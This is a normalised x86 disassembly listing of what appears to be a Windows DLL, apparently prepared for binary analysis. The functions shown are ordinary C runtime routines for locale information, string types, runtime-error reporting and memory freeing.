mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1001e264
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1001b6e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10019f03
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10019b49
pop ecx
cmp eax ebx
je r-xdata
call sub_10021dc0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1001e34b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001e264
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001e38b
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10024bf1
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_10019e40
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_1001750d
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_10019e40
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_1001e848
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10024bf1
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1001b892
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_1001750d
pop ecx
inc esi
push esi
push eax
call sub_10019e40
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_1001750d
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10024bf1
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
sub_1001e546
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1001e56c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1001e546
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
push 0x3
call sub_10024e8a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_10024e8a
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10024e27
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10018330
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1001b892
push esi
call sub_10024e0c
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10024e27
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_10024d97
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_10024e0c
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_100178fb
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_10024d97
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_10024c2b
add esp 0xc
jmp r-xdata
sub_1001e71b
push 0x3
call sub_10024e8a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1001e56c
push 0xff
call sub_1001e56c
pop ecx
pop ecx
push 0x3
call sub_10024e8a
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1001e7f0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10024fdc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10024fdc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001e848
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_1001e8fd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
pop ebp
retn
sub_1001e930
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1001e38b
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001e38b
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001e38b
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001e38b
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_1001f12f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1001750d
push [ esi + 0x8 ]
call sub_1001750d
push [ esi + 0xc ]
call sub_1001750d
push [ esi + 0x10 ]
call sub_1001750d
push [ esi + 0x14 ]
call sub_1001750d
push [ esi + 0x18 ]
call sub_1001750d
push [ esi ]
call sub_1001750d
push [ esi + 0x20 ]
call sub_1001750d
push [ esi + 0x24 ]
call sub_1001750d
push [ esi + 0x28 ]
call sub_1001750d
push [ esi + 0x2c ]
call sub_1001750d
push [ esi + 0x30 ]
call sub_1001750d
push [ esi + 0x34 ]
call sub_1001750d
push [ esi + 0x1c ]
call sub_1001750d
push [ esi + 0x38 ]
call sub_1001750d
push [ esi + 0x3c ]
call sub_1001750d
add esp 0x40
push [ esi + 0x40 ]
call sub_1001750d
push [ esi + 0x44 ]
call sub_1001750d
push [ esi + 0x48 ]
call sub_1001750d
push [ esi + 0x4c ]
call sub_1001750d
push [ esi + 0x50 ]
call sub_1001750d
push [ esi + 0x54 ]
call sub_1001750d
push [ esi + 0x58 ]
call sub_1001750d
push [ esi + 0x5c ]
call sub_1001750d
push [ esi + 0x60 ]
call sub_1001750d
push [ esi + 0x64 ]
call sub_1001750d
push [ esi + 0x68 ]
call sub_1001750d
push [ esi + 0x6c ]
call sub_1001750d
push [ esi + 0x70 ]
call sub_1001750d
push [ esi + 0x74 ]
call sub_1001750d
push [ esi + 0x78 ]
call sub_1001750d
push [ esi + 0x7c ]
call sub_1001750d
add esp 0x40
push [ esi + 0x80 ]
call sub_1001750d
push [ esi + 0x84 ]
call sub_1001750d
push [ esi + 0x88 ]
call sub_1001750d
push [ esi + 0x8c ]
call sub_1001750d
push [ esi + 0x90 ]
call sub_1001750d
push [ esi + 0x94 ]
call sub_1001750d
push [ esi + 0x98 ]
call sub_1001750d
push [ esi + 0x9c ]
call sub_1001750d
push [ esi + 0xa0 ]
call sub_1001750d
push [ esi + 0xa4 ]
call sub_1001750d
push [ esi + 0xa8 ]
call sub_1001750d
push [ esi + 0xbc ]
call sub_1001750d
push [ esi + 0xc0 ]
call sub_1001750d
push [ esi + 0xc4 ]
call sub_1001750d
push [ esi + 0xc8 ]
call sub_1001750d
push [ esi + 0xcc ]
call sub_1001750d
add esp 0x40
push [ esi + 0xd0 ]
call sub_1001750d
push [ esi + 0xb8 ]
call sub_1001750d
push [ esi + 0xd8 ]
call sub_1001750d
push [ esi + 0xdc ]
call sub_1001750d
push [ esi + 0xe0 ]
call sub_1001750d
push [ esi + 0xe4 ]
call sub_1001750d
push [ esi + 0xe8 ]
call sub_1001750d
push [ esi + 0xec ]
call sub_1001750d
push [ esi + 0xd4 ]
call sub_1001750d
push [ esi + 0xf0 ]
call sub_1001750d
push [ esi + 0xf4 ]
call sub_1001750d
push [ esi + 0xf8 ]
call sub_1001750d
push [ esi + 0xfc ]
call sub_1001750d
push [ esi + 0x100 ]
call sub_1001750d
push [ esi + 0x104 ]
call sub_1001750d
push [ esi + 0x108 ]
call sub_1001750d
add esp 0x40
push [ esi + 0x10c ]
call sub_1001750d
push [ esi + 0x110 ]
call sub_1001750d
push [ esi + 0x114 ]
call sub_1001750d
push [ esi + 0x118 ]
call sub_1001750d
push [ esi + 0x11c ]
call sub_1001750d
push [ esi + 0x120 ]
call sub_1001750d
push [ esi + 0x124 ]
call sub_1001750d
push [ esi + 0x128 ]
call sub_1001750d
push [ esi + 0x12c ]
call sub_1001750d
push [ esi + 0x130 ]
call sub_1001750d
push [ esi + 0x134 ]
call sub_1001750d
push [ esi + 0x138 ]
call sub_1001750d
push [ esi + 0x13c ]
call sub_1001750d
push [ esi + 0x140 ]
call sub_1001750d
push [ esi + 0x144 ]
call sub_1001750d
push [ esi + 0x148 ]
call sub_1001750d
add esp 0x40
push [ esi + 0x14c ]
call sub_1001750d
push [ esi + 0x150 ]
call sub_1001750d
push [ esi + 0x154 ]
call sub_1001750d
push [ esi + 0x158 ]
call sub_1001750d
push [ esi + 0x15c ]
call sub_1001750d
push [ esi + 0x160 ]
call sub_1001750d
add esp 0x18
sub_1001f4a6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_10019e40
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_1001e930
test eax eax
